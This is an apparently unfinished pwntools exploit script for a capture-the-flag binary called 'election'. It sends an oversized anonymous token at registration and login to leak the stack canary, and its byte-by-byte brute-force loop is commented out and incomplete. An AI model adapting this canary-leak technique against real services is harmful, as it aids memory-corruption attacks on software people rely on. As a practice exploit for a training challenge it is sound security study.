#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

r = process('./election', env={"LD_PRELOAD" : "./libc.so"})
pause()

# leak canary bruteforcely
aaa = 'b' * 0xb8
canary_leaker = bytearray(b'\x00' * 0xb8)
i = 0

# while 1:
r.sendlineafter('>', '2') # register
r.sendlineafter('Register an anonymous token: ', aaa)
r.sendlineafter('>', '1') # login
r.sendlineafter('Token: ', aaa + b'\x00') 
    # if canary_leaker[i] == 0xff:
        # j = i
        # i += 1
        # while j != 0:
            
    # canary_leaker[i] += 1
    # if 'Invalid' not in r.recvline():
        # success('buf 0x10 bytes match: {}'.format(canary_leaker))
        # break

r.interactive()

